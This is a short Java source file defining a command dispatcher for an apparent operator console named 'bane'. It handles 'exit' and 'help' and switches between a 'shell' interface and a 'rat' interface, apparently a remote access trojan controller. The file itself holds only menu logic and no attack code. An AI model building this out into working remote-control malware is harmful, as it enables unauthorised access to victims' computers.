package bane.shell.dispatcher;

import bane.shell.Shell;

public class DefaultDispatcher extends Dispatcher {

    public DefaultDispatcher(Shell shell) {
        super(shell);
    }

    @Override
    public void execute(String data) {
        if(data.equals("exit")){
            super.exit();
        } else if (data.equals("help")){
            this.help();
        } else if (data.equals("rat")){
            // setting the dispatcher as the rat dispatcher
            this.setDispatcher(new RatDispatcher(this.shell));
        } else if(data.equals("shell")){
            // setting the dispatcher as the shell dispatcher
            this.setDispatcher(new ShellDispatcher(this.shell));
        }
    }

    @Override
    public void help() {
        System.out.println("help \tShow commands\n"+"rat \tChange to Rat Interface\n"+"shell \tChange to Shell Interface");
    }

}
